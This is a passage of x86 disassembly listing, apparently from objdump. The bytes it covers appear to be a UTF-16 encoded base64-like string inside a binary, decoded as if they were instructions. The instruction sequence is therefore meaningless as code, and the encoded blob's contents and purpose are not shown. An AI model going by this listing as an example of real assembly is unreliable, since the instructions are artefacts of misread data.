  40ae26:	75 00                	jne    0x40ae28
  40ae28:	46                   	inc    %esi
  40ae29:	00 72 00             	add    %dh,0x0(%edx)
  40ae2c:	4e                   	dec    %esi
  40ae2d:	00 5a 00             	add    %bl,0x0(%edx)
  40ae30:	4f                   	dec    %edi
  40ae31:	00 51 00             	add    %dl,0x0(%ecx)
  40ae34:	4d                   	dec    %ebp
  40ae35:	00 48 00             	add    %cl,0x0(%eax)
  40ae38:	35 00 69 00 4c       	xor    $0x4c006900,%eax
  40ae3d:	00 70 00             	add    %dh,0x0(%eax)
  40ae40:	67 00 7a 00          	add    %bh,0x0(%bp,%si)
  40ae44:	52                   	push   %edx
  40ae45:	00 42 00             	add    %al,0x0(%edx)
  40ae48:	77 00                	ja     0x40ae4a
  40ae4a:	49                   	dec    %ecx
  40ae4b:	00 33                	add    %dh,(%ebx)
  40ae4d:	00 58 00             	add    %bl,0x0(%eax)
  40ae50:	42                   	inc    %edx
  40ae51:	00 79 00             	add    %bh,0x0(%ecx)
  40ae54:	2f                   	das
  40ae55:	00 6b 00             	add    %ch,0x0(%ebx)
  40ae58:	4b                   	dec    %ebx
  40ae59:	00 4f 00             	add    %cl,0x0(%edi)
  40ae5c:	57                   	push   %edi
  40ae5d:	00 76 00             	add    %dh,0x0(%esi)
  40ae60:	46                   	inc    %esi
  40ae61:	00 66 00             	add    %ah,0x0(%esi)
  40ae64:	4c                   	dec    %esp
  40ae65:	00 53 00             	add    %dl,0x0(%ebx)
  40ae68:	35 00 39 00 54       	xor    $0x54003900,%eax
  40ae6d:	00 78 00             	add    %bh,0x0(%eax)
  40ae70:	73 00                	jae    0x40ae72
  40ae72:	2b 00                	sub    (%eax),%eax
  40ae74:	30 00                	xor    %al,(%eax)
  40ae76:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae77:	00 76 00             	add    %dh,0x0(%esi)
  40ae7a:	4d                   	dec    %ebp
  40ae7b:	00 64 00 76          	add    %ah,0x76(%eax,%eax,1)
  40ae7f:	00 39                	add    %bh,(%ecx)
  40ae81:	00 6b 00             	add    %ch,0x0(%ebx)
  40ae84:	63 00                	arpl   %eax,(%eax)
  40ae86:	34 00                	xor    $0x0,%al
  40ae88:	32 00                	xor    (%eax),%al
  40ae8a:	71 00                	jno    0x40ae8c
  40ae8c:	71 00                	jno    0x40ae8e
  40ae8e:	76 00                	jbe    0x40ae90
  40ae90:	6b 00 4b             	imul   $0x4b,(%eax),%eax
  40ae93:	00 6f 00             	add    %ch,0x0(%edi)
  40ae96:	53                   	push   %ebx
  40ae97:	00 6a 00             	add    %ch,0x0(%edx)
  40ae9a:	79 00                	jns    0x40ae9c
  40ae9c:	58                   	pop    %eax
  40ae9d:	00 6a 00             	add    %ch,0x0(%edx)
  40aea0:	37                   	aaa
  40aea1:	00 6d 00             	add    %ch,0x0(%ebp)
  40aea4:	76 00                	jbe    0x40aea6
  40aea6:	66 00 36             	data16 add %dh,(%esi)
  40aea9:	00 79 00             	add    %bh,0x0(%ecx)
  40aeac:	43                   	inc    %ebx
  40aead:	00 4a 00             	add    %cl,0x0(%edx)
  40aeb0:	69 00 67 00 75 00    	imul   $0x750067,(%eax),%eax
  40aeb6:	75 00                	jne    0x40aeb8
  40aeb8:	77 00                	ja     0x40aeba
  40aeba:	31 00                	xor    %eax,(%eax)
  40aebc:	61                   	popa
  40aebd:	00 78 00             	add    %bh,0x0(%eax)
  40aec0:	49                   	dec    %ecx
  40aec1:	00 36                	add    %dh,(%esi)
  40aec3:	00 36                	add    %dh,(%esi)
  40aec5:	00 58 00             	add    %bl,0x0(%eax)
  40aec8:	53                   	push   %ebx
  40aec9:	00 45 00             	add    %al,0x0(%ebp)
  40aecc:	68 00 64 00 73       	push   $0x73006400
  40aed1:	00 58 00             	add    %bl,0x0(%eax)
  40aed4:	49                   	dec    %ecx
  40aed5:	00 76 00             	add    %dh,0x0(%esi)
  40aed8:	79 00                	jns    0x40aeda
  40aeda:	4f                   	dec    %edi
  40aedb:	00 71 00             	add    %dh,0x0(%ecx)
  40aede:	47                   	inc    %edi
  40aedf:	00 67 00             	add    %ah,0x0(%edi)
  40aee2:	38 00                	cmp    %al,(%eax)
  40aee4:	4e                   	dec    %esi
  40aee5:	00 41 00             	add    %al,0x0(%ecx)
  40aee8:	6c                   	insb   (%dx),%es:(%edi)
  40aee9:	00 70 00             	add    %dh,0x0(%eax)
  40aeec:	4d                   	dec    %ebp
  40aeed:	00 49 00             	add    %cl,0x0(%ecx)
  40aef0:	53                   	push   %ebx
  40aef1:	00 30                	add    %dh,(%eax)
  40aef3:	00 4c 00 63          	add    %cl,0x63(%eax,%eax,1)
  40aef7:	00 77 00             	add    %dh,0x0(%edi)
  40aefa:	6b 00 63             	imul   $0x63,(%eax),%eax
  40aefd:	00 63 00             	add    %ah,0x0(%ebx)
  40af00:	71 00                	jno    0x40af02
  40af02:	62 00                	bound  %eax,(%eax)
  40af04:	57                   	push   %edi
  40af05:	00 39                	add    %bh,(%ecx)
  40af07:	00 69 00             	add    %ch,0x0(%ecx)
  40af0a:	42                   	inc    %edx
  40af0b:	00 6d 00             	add    %ch,0x0(%ebp)
  40af0e:	7a 00                	jp     0x40af10
  40af10:	78 00                	js     0x40af12
  40af12:	63 00                	arpl   %eax,(%eax)
  40af14:	68 00 7a 00 2f       	push   $0x2f007a00
  40af19:	00 66 00             	add    %ah,0x0(%esi)
  40af1c:	38 00                	cmp    %al,(%eax)
  40af1e:	57                   	push   %edi
  40af1f:	00 2f                	add    %ch,(%edi)
  40af21:	00 2b                	add    %ch,(%ebx)
  40af23:	00 39                	add    %bh,(%ecx)
  40af25:	00 7a 00             	add    %bh,0x0(%edx)
  40af28:	35 00 73 00 55       	xor    $0x55007300,%eax
  40af2d:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40af31:	00 77 00             	add    %dh,0x0(%edi)
  40af34:	7a 00                	jp     0x40af36
  40af36:	78 00                	js     0x40af38
  40af38:	35 00 36 00 4d       	xor    $0x4d003600,%eax
  40af3d:	00 7a 00             	add    %bh,0x0(%edx)
  40af40:	73 00                	jae    0x40af42
  40af42:	68 00 73 00 67       	push   $0x67007300
  40af47:	00 65 00             	add    %ah,0x0(%ebp)
  40af4a:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40af4e:	66 00 33             	data16 add %dh,(%ebx)
  40af51:	00 64 00 2f          	add    %ah,0x2f(%eax,%eax,1)
  40af55:	00 62 00             	add    %ah,0x0(%edx)
  40af58:	32 00                	xor    (%eax),%al
  40af5a:	72 00                	jb     0x40af5c
  40af5c:	50                   	push   %eax
  40af5d:	00 68 00             	add    %ch,0x0(%eax)
  40af60:	56                   	push   %esi
  40af61:	00 56 00             	add    %dl,0x0(%esi)
  40af64:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40af68:	66 00 77 00          	data16 add %dh,0x0(%edi)
  40af6c:	34 00                	xor    $0x0,%al
  40af6e:	4a                   	dec    %edx
  40af6f:	00 66 00             	add    %ah,0x0(%esi)
  40af72:	65 00 4b 00          	add    %cl,%gs:0x0(%ebx)
  40af76:	4f                   	dec    %edi
  40af77:	00 6e 00             	add    %ch,0x0(%esi)
  40af7a:	49                   	dec    %ecx
  40af7b:	00 4f 00             	add    %cl,0x0(%edi)
  40af7e:	56                   	push   %esi
  40af7f:	00 6b 00             	add    %ch,0x0(%ebx)
  40af82:	66 00 65 00          	data16 add %ah,0x0(%ebp)
  40af86:	41                   	inc    %ecx
  40af87:	00 75 00             	add    %dh,0x0(%ebp)
  40af8a:	45                   	inc    %ebp
  40af8b:	00 69 00             	add    %ch,0x0(%ecx)
  40af8e:	53                   	push   %ebx
  40af8f:	00 6b 00             	add    %ch,0x0(%ebx)
  40af92:	6e                   	outsb  %ds:(%esi),(%dx)
  40af93:	00 54 00 4d          	add    %dl,0x4d(%eax,%eax,1)
  40af97:	00 7a 00             	add    %bh,0x0(%edx)
  40af9a:	6e                   	outsb  %ds:(%esi),(%dx)
  40af9b:	00 57 00             	add    %dl,0x0(%edi)
  40af9e:	54                   	push   %esp
  40af9f:	00 46 00             	add    %al,0x0(%esi)
  40afa2:	67 00 67 00          	add    %ah,0x0(%bx)
  40afa6:	79 00                	jns    0x40afa8
  40afa8:	34 00                	xor    $0x0,%al
  40afaa:	70 00                	jo     0x40afac
  40afac:	4e                   	dec    %esi
  40afad:	00 69 00             	add    %ch,0x0(%ecx)
  40afb0:	7a 00                	jp     0x40afb2
  40afb2:	32 00                	xor    (%eax),%al
  40afb4:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  40afb8:	57                   	push   %edi
  40afb9:	00 59 00             	add    %bl,0x0(%ecx)
  40afbc:	66 00 46 00          	data16 add %al,0x0(%esi)
  40afc0:	4f                   	dec    %edi
  40afc1:	00 56 00             	add    %dl,0x0(%esi)
  40afc4:	37                   	aaa
  40afc5:	00 70 00             	add    %dh,0x0(%eax)
  40afc8:	4e                   	dec    %esi
  40afc9:	00 4d 00             	add    %cl,0x0(%ebp)
  40afcc:	7a 00                	jp     0x40afce
  40afce:	46                   	inc    %esi
  40afcf:	00 34 00             	add    %dh,(%eax,%eax,1)
  40afd2:	54                   	push   %esp
  40afd3:	00 2b                	add    %ch,(%ebx)
  40afd5:	00 43 00             	add    %al,0x0(%ebx)
  40afd8:	58                   	pop    %eax
  40afd9:	00 37                	add    %dh,(%edi)
  40afdb:	00 34 00             	add    %dh,(%eax,%eax,1)
  40afde:	74 00                	je     0x40afe0
  40afe0:	42                   	inc    %edx
  40afe1:	00 47 00             	add    %al,0x0(%edi)
  40afe4:	62 00                	bound  %eax,(%eax)
  40afe6:	47                   	inc    %edi
  40afe7:	00 78 00             	add    %bh,0x0(%eax)
  40afea:	71 00                	jno    0x40afec
  40afec:	62 00                	bound  %eax,(%eax)
  40afee:	73 00                	jae    0x40aff0
  40aff0:	31 00                	xor    %eax,(%eax)
  40aff2:	78 00                	js     0x40aff4
  40aff4:	50                   	push   %eax
  40aff5:	00 73 00             	add    %dh,0x0(%ebx)
  40aff8:	78 00                	js     0x40affa
  40affa:	62 00                	bound  %eax,(%eax)
  40affc:	36 00 73 00          	add    %dh,%ss:0x0(%ebx)
  40b000:	75 00                	jne    0x40b002
  40b002:	50                   	push   %eax
  40b003:	00 32                	add    %dh,(%edx)
  40b005:	00 62 00             	add    %ah,0x0(%edx)
  40b008:	68 00 38 00 45       	push   $0x45003800
  40b00d:	00 30                	add    %dh,(%eax)
  40b00f:	00 74 00 31          	add    %dh,0x31(%eax,%eax,1)
  40b013:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b016:	44                   	inc    %esp
  40b017:	00 55 00             	add    %dl,0x0(%ebp)
  40b01a:	78 00                	js     0x40b01c
  40b01c:	59                   	pop    %ecx
  40b01d:	00 36                	add    %dh,(%esi)
  40b01f:	00 48 00             	add    %cl,0x0(%eax)
  40b022:	4b                   	dec    %ebx
  40b023:	00 75 00             	add    %dh,0x0(%ebp)
  40b026:	77 00                	ja     0x40b028
  40b028:	32 00                	xor    (%eax),%al
  40b02a:	69 00 30 00 73 00    	imul   $0x730030,(%eax),%eax
  40b030:	4c                   	dec    %esp
  40b031:	00 6a 00             	add    %ch,0x0(%edx)
  40b034:	45                   	inc    %ebp
  40b035:	00 68 00             	add    %ch,0x0(%eax)
  40b038:	41                   	inc    %ecx
  40b039:	00 49 00             	add    %cl,0x0(%ecx)
  40b03c:	51                   	push   %ecx
  40b03d:	00 2b                	add    %ch,(%ebx)
  40b03f:	00 62 00             	add    %ah,0x0(%edx)
  40b042:	77 00                	ja     0x40b044
  40b044:	6e                   	outsb  %ds:(%esi),(%dx)
  40b045:	00 47 00             	add    %al,0x0(%edi)
  40b048:	4a                   	dec    %edx
  40b049:	00 73 00             	add    %dh,0x0(%ebx)
  40b04c:	4c                   	dec    %esp
  40b04d:	00 33                	add    %dh,(%ebx)
  40b04f:	00 30                	add    %dh,(%eax)
  40b051:	00 48 00             	add    %cl,0x0(%eax)
  40b054:	35 00 54 00 78       	xor    $0x78005400,%eax
  40b059:	00 68 00             	add    %ch,0x0(%eax)
  40b05c:	68 00 35 00 62       	push   $0x62003500
  40b061:	00 68 00             	add    %ch,0x0(%eax)
  40b064:	48                   	dec    %eax
  40b065:	00 59 00             	add    %bl,0x0(%ecx)
  40b068:	34 00                	xor    $0x0,%al
  40b06a:	6d                   	insl   (%dx),%es:(%edi)
  40b06b:	00 42 00             	add    %al,0x0(%edx)
  40b06e:	72 00                	jb     0x40b070
  40b070:	41                   	inc    %ecx
  40b071:	00 66 00             	add    %ah,0x0(%esi)
  40b074:	46                   	inc    %esi
  40b075:	00 44 00 6a          	add    %al,0x6a(%eax,%eax,1)
  40b079:	00 44 00 67          	add    %al,0x67(%eax,%eax,1)
  40b07d:	00 4b 00             	add    %cl,0x0(%ebx)
  40b080:	69 00 39 00 42 00    	imul   $0x420039,(%eax),%eax
  40b086:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40b08a:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40b08e:	43                   	inc    %ebx
  40b08f:	00 42 00             	add    %al,0x0(%edx)
  40b092:	71 00                	jno    0x40b094
  40b094:	2f                   	das
  40b095:	00 47 00             	add    %al,0x0(%edi)
  40b098:	50                   	push   %eax
  40b099:	00 55 00             	add    %dl,0x0(%ebp)
  40b09c:	49                   	dec    %ecx
  40b09d:	00 59 00             	add    %bl,0x0(%ecx)
  40b0a0:	50                   	push   %eax
  40b0a1:	00 53 00             	add    %dl,0x0(%ebx)
  40b0a4:	73 00                	jae    0x40b0a6
  40b0a6:	57                   	push   %edi
  40b0a7:	00 44 00 4f          	add    %al,0x4f(%eax,%eax,1)
  40b0ab:	00 69 00             	add    %ch,0x0(%ecx)
  40b0ae:	4d                   	dec    %ebp
  40b0af:	00 49 00             	add    %cl,0x0(%ecx)
  40b0b2:	4e                   	dec    %esi
  40b0b3:	00 62 00             	add    %ah,0x0(%edx)
  40b0b6:	50                   	push   %eax
  40b0b7:	00 77 00             	add    %dh,0x0(%edi)
  40b0ba:	36 00 54 00 71       	add    %dl,%ss:0x71(%eax,%eax,1)
  40b0bf:	00 6f 00             	add    %ch,0x0(%edi)
  40b0c2:	63 00                	arpl   %eax,(%eax)
  40b0c4:	44                   	inc    %esp
  40b0c5:	00 55 00             	add    %dl,0x0(%ebp)
  40b0c8:	77 00                	ja     0x40b0ca
  40b0ca:	66 00 52 00          	data16 add %dl,0x0(%edx)
  40b0ce:	4b                   	dec    %ebx
  40b0cf:	00 4d 00             	add    %cl,0x0(%ebp)
  40b0d2:	5a                   	pop    %edx
  40b0d3:	00 32                	add    %dh,(%edx)
  40b0d5:	00 38                	add    %bh,(%eax)
  40b0d7:	00 53 00             	add    %dl,0x0(%ebx)
  40b0da:	46                   	inc    %esi
  40b0db:	00 69 00             	add    %ch,0x0(%ecx)
  40b0de:	76 00                	jbe    0x40b0e0
  40b0e0:	37                   	aaa
  40b0e1:	00 69 00             	add    %ch,0x0(%ecx)
  40b0e4:	76 00                	jbe    0x40b0e6
  40b0e6:	48                   	dec    %eax
  40b0e7:	00 6c 00 31          	add    %ch,0x31(%eax,%eax,1)
  40b0eb:	00 68 00             	add    %ch,0x0(%eax)
  40b0ee:	57                   	push   %edi
  40b0ef:	00 77 00             	add    %dh,0x0(%edi)
  40b0f2:	6e                   	outsb  %ds:(%esi),(%dx)
  40b0f3:	00 47 00             	add    %al,0x0(%edi)
  40b0f6:	49                   	dec    %ecx
  40b0f7:	00 6b 00             	add    %ch,0x0(%ebx)
  40b0fa:	74 00                	je     0x40b0fc
  40b0fc:	6d                   	insl   (%dx),%es:(%edi)
  40b0fd:	00 48 00             	add    %cl,0x0(%eax)
  40b100:	46                   	inc    %esi
  40b101:	00 46 00             	add    %al,0x0(%esi)
  40b104:	74 00                	je     0x40b106
  40b106:	6f                   	outsl  %ds:(%esi),(%dx)
  40b107:	00 75 00             	add    %dh,0x0(%ebp)
  40b10a:	7a 00                	jp     0x40b10c
  40b10c:	50                   	push   %eax
  40b10d:	00 6a 00             	add    %ch,0x0(%edx)
  40b110:	32 00                	xor    (%eax),%al
  40b112:	30 00                	xor    %al,(%eax)
  40b114:	4d                   	dec    %ebp
  40b115:	00 73 00             	add    %dh,0x0(%ebx)
  40b118:	45                   	inc    %ebp
  40b119:	00 38                	add    %bh,(%eax)
  40b11b:	00 6f 00             	add    %ch,0x0(%edi)
  40b11e:	37                   	aaa
  40b11f:	00 51 00             	add    %dl,0x0(%ecx)
  40b122:	2f                   	das
  40b123:	00 79 00             	add    %bh,0x0(%ecx)
  40b126:	63 00                	arpl   %eax,(%eax)
  40b128:	33 00                	xor    (%eax),%eax
  40b12a:	41                   	inc    %ecx
  40b12b:	00 2b                	add    %ch,(%ebx)
  40b12d:	00 4e 00             	add    %cl,0x0(%esi)
  40b130:	4a                   	dec    %edx
  40b131:	00 4a 00             	add    %cl,0x0(%edx)
  40b134:	64 00 68 00          	add    %ch,%fs:0x0(%eax)
  40b138:	69 00 4c 00 78 00    	imul   $0x78004c,(%eax),%eax
  40b13e:	56                   	push   %esi
  40b13f:	00 54 00 59          	add    %dl,0x59(%eax,%eax,1)
  40b143:	00 6f 00             	add    %ch,0x0(%edi)
  40b146:	46                   	inc    %esi
  40b147:	00 66 00             	add    %ah,0x0(%esi)
  40b14a:	77 00                	ja     0x40b14c
  40b14c:	6a 00                	push   $0x0
  40b14e:	43                   	inc    %ebx
  40b14f:	00 36                	add    %dh,(%esi)
  40b151:	00 32                	add    %dh,(%edx)
  40b153:	00 78 00             	add    %bh,0x0(%eax)
  40b156:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40b15a:	67 00 6b 00          	add    %ch,0x0(%bp,%di)
  40b15e:	76 00                	jbe    0x40b160
  40b160:	53                   	push   %ebx
  40b161:	00 5a 00             	add    %bl,0x0(%edx)
  40b164:	4b                   	dec    %ebx
  40b165:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b168:	32 00                	xor    (%eax),%al
  40b16a:	42                   	inc    %edx
  40b16b:	00 59 00             	add    %bl,0x0(%ecx)
  40b16e:	64 00 67 00          	add    %ah,%fs:0x0(%edi)
  40b172:	78 00                	js     0x40b174
  40b174:	7a 00                	jp     0x40b176
  40b176:	75 00                	jne    0x40b178
  40b178:	30 00                	xor    %al,(%eax)
  40b17a:	69 00 35 00 54 00    	imul   $0x540035,(%eax),%eax
  40b180:	43                   	inc    %ebx
  40b181:	00 67 00             	add    %ah,0x0(%edi)
  40b184:	76 00                	jbe    0x40b186
  40b186:	61                   	popa
  40b187:	00 4e 00             	add    %cl,0x0(%esi)
  40b18a:	58                   	pop    %eax
  40b18b:	00 79 00             	add    %bh,0x0(%ecx)
  40b18e:	41                   	inc    %ecx
  40b18f:	00 59 00             	add    %bl,0x0(%ecx)
  40b192:	44                   	inc    %esp
  40b193:	00 4e 00             	add    %cl,0x0(%esi)
  40b196:	38 00                	cmp    %al,(%eax)
  40b198:	65 00 4f 00          	add    %cl,%gs:0x0(%edi)
  40b19c:	31 00                	xor    %eax,(%eax)
  40b19e:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
  40b1a2:	4c                   	dec    %esp
  40b1a3:	00 76 00             	add    %dh,0x0(%esi)
  40b1a6:	37                   	aaa
  40b1a7:	00 6f 00             	add    %ch,0x0(%edi)
  40b1aa:	65 00 4a 00          	add    %cl,%gs:0x0(%edx)
  40b1ae:	43                   	inc    %ebx
  40b1af:	00 6f 00             	add    %ch,0x0(%edi)
  40b1b2:	64 00 32             	add    %dh,%fs:(%edx)
  40b1b5:	00 61 00             	add    %ah,0x0(%ecx)
  40b1b8:	65 00 75 00          	add    %dh,%gs:0x0(%ebp)
  40b1bc:	6e                   	outsb  %ds:(%esi),(%dx)
  40b1bd:	00 69 00             	add    %ch,0x0(%ecx)
  40b1c0:	4f                   	dec    %edi
  40b1c1:	00 6d 00             	add    %ch,0x0(%ebp)
  40b1c4:	38 00                	cmp    %al,(%eax)
  40b1c6:	59                   	pop    %ecx
  40b1c7:	00 37                	add    %dh,(%edi)
  40b1c9:	00 6b 00             	add    %ch,0x0(%ebx)
  40b1cc:	50                   	push   %eax
  40b1cd:	00 38                	add    %bh,(%eax)
  40b1cf:	00 48 00             	add    %cl,0x0(%eax)
  40b1d2:	32 00                	xor    (%eax),%al
  40b1d4:	53                   	push   %ebx
  40b1d5:	00 48 00             	add    %cl,0x0(%eax)
  40b1d8:	79 00                	jns    0x40b1da
  40b1da:	6c                   	insb   (%dx),%es:(%edi)
  40b1db:	00 7a 00             	add    %bh,0x0(%edx)
  40b1de:	2b 00                	sub    (%eax),%eax
  40b1e0:	78 00                	js     0x40b1e2
  40b1e2:	66 00 53 00          	data16 add %dl,0x0(%ebx)
  40b1e6:	64 00 4b 00          	add    %cl,%fs:0x0(%ebx)
  40b1ea:	4c                   	dec    %esp
  40b1eb:	00 33                	add    %dh,(%ebx)
  40b1ed:	00 73 00             	add    %dh,0x0(%ebx)
  40b1f0:	2f                   	das
  40b1f1:	00 48 00             	add    %cl,0x0(%eax)
  40b1f4:	5a                   	pop    %edx
  40b1f5:	00 57 00             	add    %dl,0x0(%edi)
  40b1f8:	56                   	push   %esi
  40b1f9:	00 68 00             	add    %ch,0x0(%eax)
  40b1fc:	51                   	push   %ecx
  40b1fd:	00 4f 00             	add    %cl,0x0(%edi)
  40b200:	72 00                	jb     0x40b202
  40b202:	71 00                	jno    0x40b204
  40b204:	4a                   	dec    %edx
  40b205:	00 42 00             	add    %al,0x0(%edx)
  40b208:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40b20c:	76 00                	jbe    0x40b20e
  40b20e:	51                   	push   %ecx
  40b20f:	00 61 00             	add    %ah,0x0(%ecx)
  40b212:	32 00                	xor    (%eax),%al
  40b214:	54                   	push   %esp
  40b215:	00 63 00             	add    %ah,0x0(%ebx)
  40b218:	5a                   	pop    %edx
  40b219:	00 68 00             	add    %ch,0x0(%eax)
  40b21c:	6f                   	outsl  %ds:(%esi),(%dx)
  40b21d:	00 76 00             	add    %dh,0x0(%esi)
  40b220:	4d                   	dec    %ebp
  40b221:	00 61 00             	add    %ah,0x0(%ecx)
  40b224:	67 00 6a 00          	add    %ch,0x0(%bp,%si)
  40b228:	61                   	popa
  40b229:	00 72 00             	add    %dh,0x0(%edx)
  40b22c:	58                   	pop    %eax
  40b22d:	00 6f 00             	add    %ch,0x0(%edi)
  40b230:	39 00                	cmp    %eax,(%eax)
  40b232:	59                   	pop    %ecx
  40b233:	00 2b                	add    %ch,(%ebx)
  40b235:	00 4a 00             	add    %cl,0x0(%edx)
  40b238:	46                   	inc    %esi
  40b239:	00 45 00             	add    %al,0x0(%ebp)
  40b23c:	52                   	push   %edx
  40b23d:	00 65 00             	add    %ah,0x0(%ebp)
  40b240:	52                   	push   %edx
  40b241:	00 62 00             	add    %ah,0x0(%edx)
  40b244:	6f                   	outsl  %ds:(%esi),(%dx)
  40b245:	00 59 00             	add    %bl,0x0(%ecx)
  40b248:	41                   	inc    %ecx
  40b249:	00 37                	add    %dh,(%edi)
  40b24b:	00 52 00             	add    %dl,0x0(%edx)
  40b24e:	30 00                	xor    %al,(%eax)
  40b250:	45                   	inc    %ebp
  40b251:	00 53 00             	add    %dl,0x0(%ebx)
  40b254:	55                   	push   %ebp
  40b255:	00 41 00             	add    %al,0x0(%ecx)
  40b258:	32 00                	xor    (%eax),%al
  40b25a:	76 00                	jbe    0x40b25c
  40b25c:	59                   	pop    %ecx
  40b25d:	00 4b 00             	add    %cl,0x0(%ebx)
  40b260:	6f                   	outsl  %ds:(%esi),(%dx)
  40b261:	00 56 00             	add    %dl,0x0(%esi)
  40b264:	44                   	inc    %esp
  40b265:	00 6f 00             	add    %ch,0x0(%edi)
  40b268:	30 00                	xor    %al,(%eax)
  40b26a:	74 00                	je     0x40b26c
  40b26c:	46                   	inc    %esi
  40b26d:	00 72 00             	add    %dh,0x0(%edx)
  40b270:	73 00                	jae    0x40b272
  40b272:	6b 00 79             	imul   $0x79,(%eax),%eax
  40b275:	00 65 00             	add    %ah,0x0(%ebp)
  40b278:	74 00                	je     0x40b27a
  40b27a:	52                   	push   %edx
  40b27b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b27e:	48                   	dec    %eax
  40b27f:	00 6e 00             	add    %ch,0x0(%esi)
  40b282:	70 00                	jo     0x40b284
  40b284:	78 00                	js     0x40b286
  40b286:	35 00 43 00 68       	xor    $0x68004300,%eax
  40b28b:	00 66 00             	add    %ah,0x0(%esi)
  40b28e:	53                   	push   %ebx
  40b28f:	00 71 00             	add    %dh,0x0(%ecx)
  40b292:	78 00                	js     0x40b294
  40b294:	45                   	inc    %ebp
  40b295:	00 74 00 49          	add    %dh,0x49(%eax,%eax,1)
  40b299:	00 55 00             	add    %dl,0x0(%ebp)
  40b29c:	78 00                	js     0x40b29e
  40b29e:	55                   	push   %ebp
  40b29f:	00 37                	add    %dh,(%edi)
  40b2a1:	00 4a 00             	add    %cl,0x0(%edx)
  40b2a4:	46                   	inc    %esi
  40b2a5:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40b2a9:	00 58 00             	add    %bl,0x0(%eax)
  40b2ac:	63 00                	arpl   %eax,(%eax)
  40b2ae:	7a 00                	jp     0x40b2b0
  40b2b0:	4d                   	dec    %ebp
  40b2b1:	00 44 00 68          	add    %al,0x68(%eax,%eax,1)
  40b2b5:	00 7a 00             	add    %bh,0x0(%edx)
  40b2b8:	6d                   	insl   (%dx),%es:(%edi)
  40b2b9:	00 39                	add    %bh,(%ecx)
  40b2bb:	00 79 00             	add    %bh,0x0(%ecx)
  40b2be:	51                   	push   %ecx
  40b2bf:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b2c2:	48                   	dec    %eax
  40b2c3:	00 39                	add    %bh,(%ecx)
  40b2c5:	00 6c 00 2b          	add    %ch,0x2b(%eax,%eax,1)
  40b2c9:	00 46 00             	add    %al,0x0(%esi)
  40b2cc:	41                   	inc    %ecx
  40b2cd:	00 58 00             	add    %bl,0x0(%eax)
  40b2d0:	69 00 79 00 38 00    	imul   $0x380079,(%eax),%eax
  40b2d6:	72 00                	jb     0x40b2d8
  40b2d8:	36 00 6b 00          	add    %ch,%ss:0x0(%ebx)
  40b2dc:	4a                   	dec    %edx
  40b2dd:	00 2f                	add    %ch,(%edi)
  40b2df:	00 64 00 44          	add    %ah,0x44(%eax,%eax,1)
  40b2e3:	00 4a 00             	add    %cl,0x0(%edx)
  40b2e6:	48                   	dec    %eax
  40b2e7:	00 72 00             	add    %dh,0x0(%edx)
  40b2ea:	56                   	push   %esi
  40b2eb:	00 35 00 76 00 49    	add    %dh,0x49007600
  40b2f1:	00 77 00             	add    %dh,0x0(%edi)
  40b2f4:	2f                   	das
  40b2f5:	00 5a 00             	add    %bl,0x0(%edx)
  40b2f8:	72 00                	jb     0x40b2fa
  40b2fa:	6a 00                	push   $0x0
  40b2fc:	6f                   	outsl  %ds:(%esi),(%dx)
  40b2fd:	00 71 00             	add    %dh,0x0(%ecx)
  40b300:	32 00                	xor    (%eax),%al
  40b302:	51                   	push   %ecx
  40b303:	00 68 00             	add    %ch,0x0(%eax)
  40b306:	45                   	inc    %ebp
  40b307:	00 6a 00             	add    %ch,0x0(%edx)
  40b30a:	4a                   	dec    %edx
  40b30b:	00 4e 00             	add    %cl,0x0(%esi)
  40b30e:	31 00                	xor    %eax,(%eax)
  40b310:	48                   	dec    %eax
  40b311:	00 79 00             	add    %bh,0x0(%ecx)
  40b314:	77 00                	ja     0x40b316
  40b316:	61                   	popa
  40b317:	00 30                	add    %dh,(%eax)
  40b319:	00 43 00             	add    %al,0x0(%ebx)
  40b31c:	72 00                	jb     0x40b31e
  40b31e:	6d                   	insl   (%dx),%es:(%edi)
  40b31f:	00 54 00 6c          	add    %dl,0x6c(%eax,%eax,1)
  40b323:	00 43 00             	add    %al,0x0(%ebx)
  40b326:	78 00                	js     0x40b328
  40b328:	63 00                	arpl   %eax,(%eax)
  40b32a:	5a                   	pop    %edx
  40b32b:	00 53 00             	add    %dl,0x0(%ebx)
  40b32e:	2b 00                	sub    (%eax),%eax
  40b330:	74 00                	je     0x40b332
  40b332:	75 00                	jne    0x40b334
  40b334:	36 00 41 00          	add    %al,%ss:0x0(%ecx)
  40b338:	39 00                	cmp    %eax,(%eax)
  40b33a:	39 00                	cmp    %eax,(%eax)
  40b33c:	2f                   	das
  40b33d:	00 52 00             	add    %dl,0x0(%edx)
  40b340:	71 00                	jno    0x40b342
  40b342:	49                   	dec    %ecx
  40b343:	00 57 00             	add    %dl,0x0(%edi)
  40b346:	53                   	push   %ebx
  40b347:	00 6a 00             	add    %ch,0x0(%edx)
  40b34a:	42                   	inc    %edx
  40b34b:	00 49 00             	add    %cl,0x0(%ecx)
  40b34e:	62 00                	bound  %eax,(%eax)
  40b350:	6e                   	outsb  %ds:(%esi),(%dx)
  40b351:	00 36                	add    %dh,(%esi)
  40b353:	00 79 00             	add    %bh,0x0(%ecx)
  40b356:	41                   	inc    %ecx
  40b357:	00 67 00             	add    %ah,0x0(%edi)
  40b35a:	76 00                	jbe    0x40b35c
  40b35c:	68 00 71 00 51       	push   $0x51007100
  40b361:	00 6d 00             	add    %ch,0x0(%ebp)
  40b364:	71 00                	jno    0x40b366
  40b366:	36 00 4c 00 59       	add    %cl,%ss:0x59(%eax,%eax,1)
  40b36b:	00 53 00             	add    %dl,0x0(%ebx)
  40b36e:	75 00                	jne    0x40b370
  40b370:	4d                   	dec    %ebp
  40b371:	00 35 00 7a 00 37    	add    %dh,0x37007a00
  40b377:	00 68 00             	add    %ch,0x0(%eax)
  40b37a:	6a 00                	push   $0x0
